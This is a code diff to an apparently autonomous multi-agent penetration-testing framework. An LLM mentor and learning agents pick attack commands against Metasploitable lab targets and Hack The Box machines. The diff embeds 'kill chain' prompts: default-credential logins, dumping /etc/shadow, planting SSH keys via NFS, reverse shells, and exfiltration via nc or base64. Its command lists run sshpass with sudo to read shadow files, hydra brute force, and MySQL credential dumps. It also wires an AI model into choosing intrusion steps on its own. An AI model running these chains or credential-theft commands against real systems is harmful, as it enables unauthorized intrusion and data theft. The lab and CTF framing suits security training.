@@ -95,11 +95,11 @@ class SmartDecisionResult:
     
     # Command info
     command: str
-    template_name: str
-    params: Dict[str, str]
+    template_name: str = ""
+    params: Dict[str, str] = field(default_factory=dict)
     
     # Mentor info
-    mentor_call: bool
+    mentor_call: bool = False
     model_used: Optional[str] = None
     mentor_reasoning: Optional[str] = None
     mentor_delta: str = "kept"
@@ -132,6 +132,9 @@ class SmartDecisionResult:
     
     # Phase 6: Mentor imitation learning
     _mentor_suggestion: Optional[str] = None  # Template name mentor suggested (for imitation bonus)
+    
+    # Anti-repeat penalty tracking
+    _repeat_penalty: float = 0.0
     
     # Phase 6.3: Reasoning trace — why this decision was made
     reasoning: str = ""  # Human-readable chain: "PPO proposed nmap → anti-repeat blocked → registry fallback to nikto"
@@ -403,6 +406,11 @@ class SmartCoach:
         self._reasoning_failures: List[str] = []  # What failed and why
         self._reasoning_plan: Optional[str] = None  # Current attack plan from mentor
         self._exploration_score: float = 1.0  # Decays as we repeat actions, resets on new discovery
+        
+        # ─── Output lessons (recorded from command output analysis) ──────
+        self._output_lessons: List[str] = []
+        self._max_output_lessons: int = 75  # Phase 11.5: +50% (was 50)
+        self._output_patterns_learned: List[str] = []  # Phase 11.5: Fixed init (was missing)
         
         logger.debug(f"SmartCoach initialized for {agent_name} | Role: {self.agent_role['role']} | {self.agent_role['description']}")
 
@@ -901,7 +909,7 @@ class SmartCoach:
         self,
         step_ctx: "SmartStepContext",
         thresholds: List[float] = [0.8, 0.6, 0.4, 0.0],
-    ) -> "SmartDecisionResult":
+    ) -> Optional["SmartDecisionResult"]:
         """
         Force a novel action using fallback ladder of decreasing thresholds.
         
@@ -1025,6 +1033,7 @@ class SmartCoach:
         """
         # Target-aware port and credential defaults
         is_ms3 = ctx.target in ("172.28.0.11",) or getattr(ctx, 'difficulty', '') == 'medium'
+        is_ms2 = ctx.target in ("172.28.0.10",) and not is_ms3
         if is_ms3:
             # Phase 7.3: VERIFIED — only these ports are open on the real MS3 Docker
             target_ports = "21,22,111,139,445,3306"
@@ -1032,14 +1041,50 @@ class SmartCoach:
             default_user = "msfadmin"
             default_pass = "msfadmin"
             default_rport = "22"
-        else:
+        elif is_ms2:
             target_ports = "21,22,23,25,80,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6667,8180"
             default_user = "msfadmin"
             default_pass = "msfadmin"
             default_rport = "445"
-        # Attacker IP — same subnet as target, .1 gateway convention
-        parts = ctx.target.rsplit(".", 1)
-        attacker_ip = f"{parts[0]}.1" if len(parts) == 2 else "172.28.0.1"
+        else:
+            # HTB / generic targets — use discovered data only, no default creds
+            _disc = getattr(ctx, 'discovered_ports', None) or set()
+            target_ports = ",".join(str(p) for p in sorted(_disc)) if _disc else "22,80"
+            # Extract credentials from discovery board if available
+            _disc_creds = getattr(ctx, 'credentials', None) or set()
+            _cred_user, _cred_pass = "", ""
+            if isinstance(_disc_creds, (set, list)):
+                for _c in _disc_creds:
+                    if isinstance(_c, str) and ":" in _c:
+                        _cred_user, _cred_pass = _c.split(":", 1)
+                        break
+            default_user = _cred_user
+            default_pass = _cred_pass
+            default_rport = "80"
+        # Attacker IP — detect tun0 for HTB, gateway convention for lab
+        if is_ms2 or is_ms3:
+            parts = ctx.target.rsplit(".", 1)
+            attacker_ip = f"{parts[0]}.1" if len(parts) == 2 else "172.28.0.1"
+        else:
+            # HTB: detect tun0 IP dynamically
+            import os as _os_sc
+            attacker_ip = _os_sc.environ.get("ARIASKA_LHOST", "")
+            if not attacker_ip:
+                try:
+                    import subprocess as _subp_sc
+                    _tun = _subp_sc.run(
+                        ["ip", "-4", "addr", "show", "tun0"],
+                        capture_output=True, text=True, timeout=2,
+                    )
+                    if _tun.returncode == 0:
+                        import re as _re_sc
+                        _m = _re_sc.search(r'inet (\d+\.\d+\.\d+\.\d+)', _tun.stdout)
+                        if _m:
+                            attacker_ip = _m.group(1)
+                except Exception:
+                    pass
+            if not attacker_ip:
+                attacker_ip = "10.10.15.20"  # Fallback
 
         defaults = {
             # ─── Target identifiers ──────────────────────────────
@@ -1051,7 +1096,7 @@ class SmartCoach:
             "target_range": f"{ctx.target}/24",
             "url": f"http://{ctx.target}",
             "domain": ctx.target,
-            "subnet": parts[0] if len(parts) == 2 else "172.28.0",
+            "subnet": ctx.target.rsplit(".", 1)[0] if "." in ctx.target else "10.10.10",
             # ─── Ports ───────────────────────────────────────────
             "port": "80",
             "ports": target_ports,
@@ -1191,8 +1236,8 @@ class SmartCoach:
         Returns:
             Commands that don't target already-exploited services
         """
-        exploited_services = ctx.state_flags.get("_exploited_services", set())
-        exploited_ports = ctx.state_flags.get("_exploited_ports", set())
+        exploited_services: Any = ctx.state_flags.get("_exploited_services", set())
+        exploited_ports: Any = ctx.state_flags.get("_exploited_ports", set())
         
         if not exploited_services and not exploited_ports:
             return commands
@@ -1305,7 +1350,8 @@ class SmartCoach:
         """
         Ask codex-mini a quick reasoning question (e.g., 'should I move to next phase?').
         
-        Phase 7.1: Token-efficient reasoning check. Uses max_tokens=150 to keep costs low.
+        Phase 7.1: Token-efficient reasoning check. Uses max_tokens=273 to keep costs low.
+        Phase 11.3: Injects output interpretation lessons so agents learn to reason about output.
         Only called when agent is genuinely unsure — not on every step.
         
         Args:
@@ -1370,6 +1416,20 @@ class SmartCoach:
         except Exception:
             pass
         
+        # Phase 11.3: Output interpretation lessons — teach agent to reason about output
+        _output_learn_ctx = ""
+        if self._output_lessons:
+            _recent = self._output_lessons[-5:]  # Last 5 lessons
+            _output_learn_ctx = (
+                f"\nOUTPUT INTERPRETATION LESSONS (learned from previous commands):\n"
+                + "\n".join(f"- {l}" for l in _recent)
+            )
+        if self._output_patterns_learned:
+            _pats = self._output_patterns_learned[-8:]
+            _output_learn_ctx += (
+                f"\nLEARNED PATTERNS: {'; '.join(_pats)}"
+            )
+        
         compact_prompt = (
             f"You are a senior penetration tester coordinating a team of 5 agents "
             f"(Red=offense, Scout=recon, Shadow=stealth, Blue=defense, Orion=strategy) "
@@ -1379,16 +1439,32 @@ class SmartCoach:
             f"Services: {', '.join(str(s) for s in _services[:5])} | "
             f"Creds: {'msfadmin:msfadmin' if ctx.state_flags.get('credentials_known') else 'unknown'} | "
             f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'} | "
-            f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}"
-            f"{_team_ctx}{_failures_str}{_chain_str}{_plan_str}{_cognitive_ctx}\n"
-            f"\nMS3 KILL CHAINS (proven paths):\n"
-            f"1. SSH: nmap→ssh_login msfadmin:msfadmin→sudo su→dump /etc/shadow→exfil\n"
-            f"2. ProFTPD: nmap→ftp_anon 21→proftpd_exploit→shell→privesc→exfil\n"
-            f"3. Samba: enum4linux→samba_exploit 445→shell→dump credentials→exfil\n"
-            f"4. MySQL: mysql_root_login root:sploitme→db_dump→exfil via base64\n"
-            f"5. Ingreslock: telnet {ctx.target} 1524→instant root→dump shadow→exfil\n"
-            f"\nThink like a team: plan 2-3 steps ahead, suggest the NEXT logical action."
-            f"\nAnswer in 1-2 concrete sentences with specific tool/command.\n"
+            f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'} | "
+            f"UserFlag: {'YES' if ctx.state_flags.get('user_flag_captured') else 'NO'} | "
+            f"RootFlag: {'YES' if ctx.state_flags.get('root_flag_captured') else 'NO'}"
+            f"{_team_ctx}{_failures_str}{_chain_str}{_plan_str}{_cognitive_ctx}{_output_learn_ctx}\n"
+            f"\nMS3 KILL CHAINS (proven paths — use these as attack playbooks):\n"
+            f"1. SSH chain: nmap -sV -p22→ssh_login msfadmin:msfadmin→sudo su→cat /root/root.txt→exfil /etc/shadow\n"
+            f"2. ProFTPD chain: nmap -sV -p21→ftp-anon→proftpd_exploit→reverse shell→sudo -l→privesc→cat flags→exfil\n"
+            f"3. Samba chain: enum4linux -a→samba_exploit 445→shell→dump /etc/shadow→credential harvest→exfil\n"
+            f"4. MySQL chain: mysql -h {ctx.target} -u root -psploitme→SELECT * FROM users→mysqldump→base64 exfil\n"
+            f"5. Ingreslock chain: telnet {ctx.target} 1524→instant root→cat /root/root.txt→cat /etc/shadow→exfil\n"
+            f"6. Tomcat chain: nmap -sV -p8180→default creds tomcat:tomcat→WAR deploy→reverse shell→privesc→flags\n"
+            f"7. VNC chain: vncviewer {ctx.target}:5900 password='password'→desktop access→terminal→sudo su→flags\n"
+            f"8. NFS chain: showmount -e {ctx.target}→mount -t nfs {ctx.target}:/ /mnt→plant SSH key→ssh root→flags\n"
+            f"\nEXPLOIT REASONING — Think step-by-step like a senior pentester:\n"
+            f"- RECONNAISSANCE: What services are running? What versions? What attack surface is exposed?\n"
+            f"- VULNERABILITY MAPPING: WHY is this service vulnerable? (default creds, backdoor, misconfig, CVE, unpatched)\n"
+            f"- EXPLOIT SELECTION: Which exploit gives the fastest path to shell? Chain multiple if needed.\n"
+            f"- PRIVILEGE ESCALATION: After initial shell → sudo -l, SUID binaries, kernel exploits, writable /etc/passwd, "
+            f"cron jobs, world-readable NFS, backdoor ports (1524, 6200)\n"
+            f"- FLAG CAPTURE: cat /home/*/user.txt (user flag), cat /root/root.txt (root flag) — ALWAYS do this before exfil\n"
+            f"- EXFILTRATION: base64 /etc/shadow, mysqldump databases, copy sensitive files via nc/scp\n"
+            f"- CHAIN LOGIC: Each action should BUILD on previous discoveries. Don't repeat failed commands.\n"
+            f"- OUTPUT READING: Look for version numbers after '/', credentials in 'login:password' format, "
+            f"open ports in 'STATE open', and error messages that reveal attack paths.\n"
+            f"\nPlan 2-3 steps ahead. Suggest the NEXT logical action with specific tool/command.\n"
+            f"Answer in 1-2 concrete sentences.\n"
             f"Question: {question}"
         )
         
@@ -1397,7 +1473,7 @@ class SmartCoach:
                 compact_prompt,
                 task_type="reasoning",
                 agent_id=self.agent_name,
-                max_tokens=150,
+                max_tokens=410,  # Phase 11.5: +50% (was 273) for ultra-deep mentor→apprentice reasoning
                 model="gpt-5.1-codex-mini",
             )
             if response:
@@ -1426,6 +1502,45 @@ class SmartCoach:
             logger.debug(f"Mentor reasoning check failed: {e}")
         
         return None
+
+    # -----------------------------------------------------------------
+    # Phase 11.3: Output Interpretation Learning Interface
+    # -----------------------------------------------------------------
+
+    def record_interpretation_lesson(self, lesson_context: str) -> None:
+        """Record an output interpretation lesson from the LLM interpreter.
+        
+        These lessons teach the agent HOW to read command output:
+        what patterns indicate success, where to find credentials,
+        how to recognize new attack surfaces, etc.
+        
+        Args:
+            lesson_context: Compact lesson string from InterpretationLesson.to_learning_context()
+        """
+        if not lesson_context or not lesson_context.strip():
+            return
+        self._output_lessons.append(lesson_context.strip()[:300])
+        if len(self._output_lessons) > self._max_output_lessons:
+            self._output_lessons = self._output_lessons[-self._max_output_lessons:]
+        logger.debug(
+            f"[{self.agent_name}] Recorded output lesson ({len(self._output_lessons)} total)"
+        )
+
+    def inject_output_patterns(self, patterns: List[str]) -> None:
+        """Inject learned output-reading patterns from the LLM interpreter.
+        
+        These are cross-episode patterns the interpreter has observed,
+        e.g. 'nmap -sV shows version after slash', 'hydra reports [port][service] host login: password'.
+        
+        Args:
+            patterns: List of pattern description strings
+        """
+        for p in patterns:
+            if p and p.strip() and p not in self._output_patterns_learned:
+                self._output_patterns_learned.append(p.strip()[:200])
+        # Cap total
+        if len(self._output_patterns_learned) > 75:  # Phase 11.5: +50% (was 50)
+            self._output_patterns_learned = self._output_patterns_learned[-75:]
 
     # =====================================================================
     # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
@@ -1678,7 +1793,12 @@ class SmartCoach:
             f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
             f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}, "
             f"creds={'YES' if ctx.state_flags.get('credentials_known') else 'NO'}, "
-            f"hash={'YES' if ctx.state_flags.get('hash_known') else 'NO'}\n\n"
+            f"hash={'YES' if ctx.state_flags.get('hash_known') else 'NO'}, "
+            f"user_flag={'YES' if ctx.state_flags.get('user_flag_captured') else 'NO'}, "
+            f"root_flag={'YES' if ctx.state_flags.get('root_flag_captured') else 'NO'}\n"
+            f"- GOALS: If shell obtained → read user flag (cat /home/*/user.txt). "
+            f"If root shell → read root flag (cat /root/root.txt). "
+            f"Flags are HIGH VALUE targets.\n\n"
             f"Recent commands tried (all failed to advance):\n"
             + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
             + f"{_chain_hint}\n\n"
@@ -1696,7 +1816,7 @@ class SmartCoach:
                 prompt=prompt,
                 task_type="strategic",  # Routes to gpt-5.2-codex
                 agent_id=self.agent_name,
-                max_tokens=200,
+                max_tokens=390,  # Phase 11.5: +50% (was 260) for ultra-rich mentor guidance
             )
 
             if not response or not isinstance(response, str) or len(response.strip()) < 5:
@@ -1757,12 +1877,13 @@ class SmartCoach:
                 ]
                 if _phase_templates:
                     _template = random.choice(_phase_templates)
-                    _chosen_template_name = _template.name
+                    _chosen_template_name = _template.name if _template else ""
                     _codex_reason = f"codex-fallback: {_codex_reason}"
                 else:
                     return None
 
             # Render the command from the template
+            assert _template is not None  # guaranteed by above guard
             params = {"target": ctx.target}
             for param in _template.required_params:
                 if param not in params:
@@ -1978,7 +2099,7 @@ class SmartCoach:
                 prompt=prompt,
                 task_type="strategic",
                 agent_id=self.agent_name,
-                max_tokens=300,
+                max_tokens=585,  # Phase 11.5: +50% (was 390) for ultra-deep mentor planning
             )
             if not response or not isinstance(response, str) or len(response.strip()) < 5:
                 return None
@@ -2018,11 +2139,12 @@ class SmartCoach:
                 if _phase_templates:
                     import random
                     _template = random.choice(_phase_templates)
-                    _chosen_name = _template.name
+                    _chosen_name = _template.name if _template else ""
                     _reason = f"strategic-fallback: {_reason}"
                 else:
                     return None
 
+            assert _template is not None  # guaranteed by above guard
             params = {"target": ctx.target}
             for param in _template.required_params:
                 if param not in params:
@@ -2093,7 +2215,7 @@ class SmartCoach:
         ctx = step_ctx.attack_context
         
         # Phase 10.3: Collect reasoning events for dashboard visibility
-        self._step_reasoning_log: List[Dict[str, str]] = []
+        self._step_reasoning_log: List[Dict[str, Any]] = []
         
         # =====================================================================
         # PHASE 6.9: CLOSEOUT HARD GATE
@@ -2218,9 +2340,11 @@ class SmartCoach:
                     f"[{self.agent_name}] Budget gate: mentor suppressed — "
                     f"pressure={_pressure:.2f}, phase={_phase_name}"
                 )
-                self._step_reasoning_log.append(
-                    f"📊 Budget pressure {_pressure:.0%} — mentor call suppressed for phase {_phase_name}"
-                )
+                self._step_reasoning_log.append({
+                    "type": "budget_throttle",
+                    "agent": self.agent_name,
+                    "message": f"📊 Budget pressure {_pressure:.0%} — mentor call suppressed for phase {_phase_name}",
+                })
         
         # Check if GPT is available
         gpt_available = (
@@ -2422,7 +2546,7 @@ class SmartCoach:
                     # Build action mask from filtered_commands
                     if self.action_mapper is not None:
                         action_mask = self.action_mapper.get_action_mask_with_counts(
-                            filtered_commands, max_repeats=1,
+                            filtered_commands, command_counts={}, max_repeats=1,
                         )
                         if not isinstance(action_mask, _torch.Tensor):
                             action_mask = _torch.tensor(action_mask, dtype=_torch.bool)
@@ -2435,7 +2559,7 @@ class SmartCoach:
                                 macro_cmds = MACRO_COMMAND_MAP.get(self._active_macro, set())
                                 _macro_indices = set()
                                 for i, tmpl in enumerate(self.action_mapper.commands):
-                                    if tmpl.name in macro_cmds:
+                                    if tmpl[0] in macro_cmds:
                                         _macro_indices.add(i)
                             except Exception:
                                 pass
@@ -2452,25 +2576,22 @@ class SmartCoach:
                         
                         # If confidence is strong enough, use the CognitionNode's action
                         if cog_result.confidence > 0.45 and cog_result.action_idx >= 0:
-                            cmds = self.action_mapper.action_to_commands(
-                                cog_result.action_idx, step_ctx.state,
+                            _cog_template = self.action_mapper.action_to_command(
+                                cog_result.action_idx,
                             )
-                            if cmds:
-                                chosen_cmd = cmds[0]
-                                # Look up template
-                                _cog_template = COMMAND_REGISTRY.get(
-                                    self.action_mapper.commands[cog_result.action_idx].name
-                                    if cog_result.action_idx < len(self.action_mapper.commands)
-                                    else ""
-                                )
+                            _cog_name = self.action_mapper.action_to_name(
+                                cog_result.action_idx,
+                            ) or ""
+                            if _cog_template:
+                                _cog_params = {"target": ctx.target}
+                                chosen_cmd = render_command(_cog_template, _cog_params)
                                 cognition_decision = SmartDecisionResult(
                                     command=chosen_cmd,
                                     source="cognition_node",
                                     confidence=cog_result.confidence,
-                                    template_name=(
-                                        _cog_template.name if _cog_template else None
-                                    ),
-                                    params={"target": ctx.target},
+                                    template_name=_cog_name,
+                                    params=_cog_params,
+                                    mentor_call=False,
                                     reasoning=(
                                         f"[COGNITION] brain={cog_result.winning_brain} "
                                         f"conf={cog_result.confidence:.2f} "
@@ -2495,8 +2616,24 @@ class SmartCoach:
             except Exception as e:
                 logger.debug(f"[COGNITION][{self.agent_name}] think() failed: {e}")
         
+        # Cascade debug — verify web_paths reach the decision point
+        _db_wp = discovery_board.get("web_paths", [])
+        if _db_wp:
+            logger.debug(
+                f"[CASCADE][{self.agent_name}] web_paths={_db_wp} "
+                f"skill={skill_result is not None}"
+            )
+        
         if skill_result is not None:
             result = skill_result
+        elif (web_followup := self._web_path_followup(step_ctx, discovery_board)) is not None:
+            # Web path follow-up takes priority over playbook — once ffuf/gobuster
+            # discovers paths like /data, we MUST explore them immediately (curl + IDOR)
+            # before the playbook chain continues with unrelated steps.
+            result = web_followup
+            logger.info(
+                f"[WEB_FOLLOWUP][{self.agent_name}] Fired: {web_followup.command[:80]}"
+            )
         elif playbook_result is not None:
             result = playbook_result
         elif codex_meta_result is not None:
@@ -2520,10 +2657,17 @@ class SmartCoach:
             # PHASE 8: CognitionNode fused a confident action from multi-brain
             result = cognition_decision
         else:
-            # Phase 6.5: Compute dynamic mentor_lead_rate
-            # Starts at 35%, decays to 15% over ~50 episodes.
-            # PPO confidence (low entropy) accelerates the decay.
-            base_mentor_rate = max(0.15, 0.35 - self.current_episode * 0.004)
+            # Phase 6.5 + Phase 11.2: Compute dynamic mentor_lead_rate
+            # Phase 11.1: Doubled base rates for learning acceleration
+            # Phase 11.5: +50% reasoning boost with confidence-gated dynamic bounds
+            # Red/Orion get TRIPLED rates for exploit reasoning learning
+            _is_key_agent = self.agent_name in ("RedAgent", "OrionAgent")
+            if _is_key_agent:
+                # Phase 11.5: +50% for Red/Orion mentor guidance — starts at 1.0, decays to 0.89
+                base_mentor_rate = max(0.89, min(1.0, 1.76 - self.current_episode * 0.009))
+            else:
+                # Phase 11.5: +50% for all agents — starts at 1.0, decays to 0.59
+                base_mentor_rate = max(0.59, min(1.0, 1.37 - self.current_episode * 0.012))
             
             # Accelerate decay if PPO is learning well (low entropy = confident)
             ppo_confidence_boost = 0.0
@@ -2536,7 +2680,29 @@ class SmartCoach:
                     if max_entropy > 0:
                         ppo_confidence_boost = max(0, 0.10 * (1.0 - avg_entropy / max_entropy))
             
-            effective_mentor_rate = max(0.15, base_mentor_rate - ppo_confidence_boost)
+            # Phase 11.5: Confidence-gated dynamic floor/ceiling (+50%)
+            # When PPO is confident (high ppo_confidence_boost) → tighten mentor bounds
+            # When PPO is unsure (low ppo_confidence_boost) → widen bounds for reasoning
+            _dynamic_floor = 0.59 if not _is_key_agent else 0.89  # Phase 11.5: +50% (was 0.39/0.59)
+            _dynamic_ceiling = 0.95 if not _is_key_agent else 1.0
+            if ppo_confidence_boost > 0.06:
+                # PPO is confident — reduce mentor floor to save tokens
+                _dynamic_floor *= max(0.6, 1.0 - ppo_confidence_boost * 3)
+                _dynamic_ceiling *= max(0.7, 1.0 - ppo_confidence_boost * 2)
+                logger.debug(
+                    f"[{self.agent_name}] PPO confident (boost={ppo_confidence_boost:.3f}) → "
+                    f"mentor bounds [{_dynamic_floor:.2f}, {_dynamic_ceiling:.2f}]"
+                )
+            elif ppo_confidence_boost < 0.02:
+                # PPO is unsure — raise floor +173% for ultra-accelerated mentor→apprentice guidance
+                _dynamic_floor *= 2.73  # Phase 11.5: +50% (was 1.82)
+                _dynamic_ceiling = min(1.0, _dynamic_ceiling * 1.21)  # Phase 11.5: +50% (was 1.14)
+                logger.debug(
+                    f"[{self.agent_name}] PPO unsure → "
+                    f"mentor bounds [{_dynamic_floor:.2f}, {_dynamic_ceiling:.2f}]"
+                )
+            
+            effective_mentor_rate = max(_dynamic_floor, min(_dynamic_ceiling, base_mentor_rate - ppo_confidence_boost))
             
             # Roll dice: mentor leads vs PPO leads
             import random as _rand
@@ -2671,15 +2837,18 @@ class SmartCoach:
                     )
                     _tc_detection = ctx.state_flags.get("detection_risk", 0.0)
                     _tc_board = {}
-                    if hasattr(ctx, 'discovery_board'):
-                        _tc_board = ctx.discovery_board or {}
-                    elif hasattr(self, '_last_discovery_board'):
+                    if hasattr(self, '_last_discovery_board'):
                         _tc_board = self._last_discovery_board or {}
 
+                    # Inject target IP into state so TC can build correct alternatives
+                    _tc_state: Dict[str, Any] = dict(ctx.state_flags) if ctx.state_flags else {}
+                    if ctx.target:
+                        _tc_state["target"] = ctx.target
+                    
                     _tactical_assessment = self.tactical_cortex.assess(
                         command=result.command or "",
                         template=_tc_template,
-                        state=ctx.state_flags if ctx.state_flags else {},
+                        state=_tc_state,
                         agent_role=self.agent_role.get("role", "red"),
                         discovery_board=_tc_board,
                         current_phase=_tc_phase_name,
@@ -2688,15 +2857,20 @@ class SmartCoach:
                     )
 
                     if _tactical_assessment and not _tactical_assessment.approved:
-                        if ppo_bypass:
-                            # PPO/CognitionNode decisions: attach warning but don't override
+                        # Playbook and PPO decisions: attach warning but don't override
+                        # Playbook is a carefully designed curriculum chain — TC shouldn't
+                        # redirect it (breaks dependency tracking with wrong template_name)
+                        _tc_bypass = ppo_bypass or result.source == "playbook"
+                        if _tc_bypass:
+                            # PPO/Playbook/CognitionNode decisions: warn but don't override
                             result.mentor_reasoning = (
                                 f"[TACTICAL-WARN:{_tactical_assessment.verdict.name}] "
                                 f"{_tactical_assessment.reasoning[:150]} | "
                                 f"{result.mentor_reasoning or ''}"
                             )
                             logger.debug(
-                                f"[{self.agent_name}] TacticalCortex warning (PPO-bypass): "
+                                f"[{self.agent_name}] TacticalCortex warning "
+                                f"({result.source}-bypass): "
                                 f"{_tactical_assessment.verdict.name} — "
                                 f"{_tactical_assessment.reasoning[:100]}"
                             )
@@ -2844,7 +3018,7 @@ class SmartCoach:
             # Store negative PPO trajectory if this overrides a PPO decision
             if self._ppo_pending is not None:
                 try:
-                    ppo = self._lazy_ppo()
+                    ppo = _lazy_ppo()
                     if ppo is not None:
                         ppo.store_transition(
                             self._ppo_pending['state'],
@@ -3240,7 +3414,7 @@ class SmartCoach:
             return
         
         try:
-            ppo = self._lazy_ppo()
+            ppo = _lazy_ppo()
             if ppo is not None:
                 ppo.store_transition(
                     state=self._ppo_pending["state"],
@@ -3406,7 +3580,7 @@ class SmartCoach:
         import random
         try:
             # 1. Get phase-valid, precondition-met commands
-            state_flags = ctx.state_flags if hasattr(ctx, 'state_flags') else set()
+            state_flags: Dict[str, Any] = ctx.state_flags if hasattr(ctx, 'state_flags') else {}
             current_phase = ctx.current_phase if hasattr(ctx, 'current_phase') else None
             
             valid_commands = get_valid_commands_for_state(state_flags, current_phase)
@@ -3538,61 +3712,95 @@ class SmartCoach:
             return result
         # ── End R48 dynamic alternative ───────────────────────────────────
         
+        # ── R48 static fallback: target-aware alternatives ────────────
+        # Check if this is an MS2 target (172.28.0.10) or HTB/generic
+        _is_ms2 = target in ("172.28.0.10", "192.168.56.101", "192.168.56.102")
+        _is_ms3 = target in ("172.28.0.11", "192.168.56.103")
+        _is_msf = _is_ms2 or _is_ms3
+        
+        # Discovered creds from attack context (for HTB targets)
+        _disc_user = ""
+        _disc_pass = ""
+        if hasattr(ctx, 'discoveries'):
+            _creds = ctx.discoveries.get("credentials", [])
+            if isinstance(_creds, list):
+                for _c in _creds:
+                    if isinstance(_c, str) and ":" in _c:
+                        _p = _c.split(":", 1)
+                        _disc_user = _p[0]
+                        _disc_pass = _p[1]
+                        break
+        
         alternative_commands = {
             "recon": [
-                f"nmap -sV -p 21,22,111,139,445,3306 {target}",
-                f"nmap -sC -p 21,22,111,139,445,3306 {target}",
-                f"nmap --script vuln -p 21,22,139,445 {target}",
-                f"nmap -sV --version-intensity 5 -p 21,22,111,139,445,3306 {target}",
-                f"nmap -A -p 21,22 {target}",
-                f"nmap --script smb-vuln* -p 139,445 {target}",
-                f"nmap --script ftp-anon,ftp-bounce -p 21 {target}",
-                f"enum4linux -a {target}",
-                f"smbclient -L //{target} -N",
+                f"nmap -sV -p 21,22,80,443 {target}",
+                f"nmap -sC -p 21,22,80,443 {target}",
+                f"nmap --script vuln -p 21,22,80 {target}",
+                f"nmap -sV --version-intensity 5 -p 21,22,80 {target}",
+                f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50",
+                f"ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -t 50",
+                f"curl -s http://{target}/ | head -100",
+                f"whatweb http://{target}",
                 f"dig @{target} ANY",
                 f"showmount -e {target}",
-                f"finger @{target}",
             ],
-            "offensive": [
-                # Phase 8.1 B7: Exploit-path priority commands first
-                # Phase 8.2 Batch 13: ALL sshpass variants use sudo to ensure uid=0(root) in output
+            "offensive": ([
+                # Generic/HTB alternatives — use discovered creds if available
+                f"curl -s http://{target}/",
+                f"curl -s http://{target}/data/ 2>/dev/null || curl -s http://{target}/download/ 2>/dev/null",
+                f"curl -s http://{target}/robots.txt",
+                f"nikto -h http://{target} -maxtime 30s",
+                f"searchsploit gunicorn",
+                f"searchsploit vsftpd 3.0",
+                f"searchsploit openssh 8.2",
+                f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst ssh://{target} -t 4",
+                f"hydra -l root -P /usr/share/nmap/nselib/data/passwords.lst ftp://{target} -t 4",
+            ] + ([
+                # If discovered creds — SSH into target
+                f"sshpass -p '{_disc_pass}' ssh -o StrictHostKeyChecking=no {_disc_user}@{target} 'id; whoami; uname -a'",
+                f"sshpass -p '{_disc_pass}' ssh -o StrictHostKeyChecking=no {_disc_user}@{target} 'sudo -l 2>/dev/null; cat /etc/passwd | head -20'",
+            ] if _disc_user and _disc_pass else [])
+            + ([
+                # MS2-specific exploitation commands
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
                 f"mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S id'",
-                f"mysql -h {target} -u root -psploitme -e 'show databases' 2>/dev/null",
-                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow; echo msfadmin | sudo -S id'",
-                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S whoami; echo msfadmin | sudo -S id'",
                 f"hydra -l msfadmin -p msfadmin ftp://{target} -t 4",
-                f"hydra -l msfadmin -p msfadmin ssh://{target} -t 4",
+                f"searchsploit proftpd 1.3.5",
+                f"searchsploit samba 3.0",
                 f"enum4linux -a {target}",
                 f"rpcclient -U '' -N {target} -c 'enumdomusers'",
                 f"smbclient //{target}/tmp -N -c 'ls'",
-                f"searchsploit proftpd 1.3.5",
-                f"searchsploit samba 3.0",
-            ],
+            ] if _is_msf else [])),
             "stealth": [
                 f"nc -zv {target} 21 2>&1",
                 f"nc -zv {target} 22 2>&1",
+                f"nc -zv {target} 80 2>&1",
+                f"nc -zv {target} 443 2>&1",
+                f"curl -s -o /dev/null -w '%{{http_code}}' http://{target}/",
+                f"curl -s http://{target}/robots.txt 2>/dev/null",
+                f"whatweb -q http://{target}",
+            ] + ([
                 f"nc -zv {target} 139 2>&1",
                 f"nc -zv {target} 445 2>&1",
                 f"nc -zv {target} 3306 2>&1",
-                f"nc -zv {target} 111 2>&1",
                 f"smbclient -L //{target} -N 2>/dev/null",
-                f"rpcclient -U '' -N {target} -c 'srvinfo'",
-                f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
                 f"enum4linux -a {target} 2>/dev/null",
-            ],
+            ] if _is_msf else []),
             "strategic": [
-                # R47 Fix #5: Removed enum4linux/smbclient/rpcclient (Shadow-exclusive)
-                f"nmap -sV -O -p 21,22,111,139,445,3306 {target}",
+                f"nmap -sV -O -p 21,22,80 {target}",
+                f"nmap --script vuln -p 21,22,80 {target}",
+                f"nmap -sC -p 21,22,80 {target}",
+                f"curl -s http://{target}/ | head -50",
+                f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50",
+            ] + ([
                 f"nmap --script smb-enum-shares -p 139,445 {target}",
                 f"nmap --script mysql-info -p 3306 {target}",
-                f"nmap --script vuln -p 21,22,139,445 {target}",
                 f"nmap -sC -p 1099,1524,2049,5432,8180 {target}",
                 f"searchsploit vsftpd 2.3.4",
                 f"searchsploit samba 3.0",
                 f"searchsploit unrealircd",
-            ],
+            ] if _is_msf else []),
             "defensive": [
                 f"ss -tlnp 2>/dev/null",
                 f"ps aux --sort=-%cpu 2>/dev/null",
@@ -3813,7 +4021,7 @@ class SmartCoach:
         base_tool = first_word.rsplit("/", 1)[-1]
         return base_tool not in self._unavailable_tools
     
-    def _get_blue_agent_command(self, ctx: AttackContext) -> SmartDecisionResult:
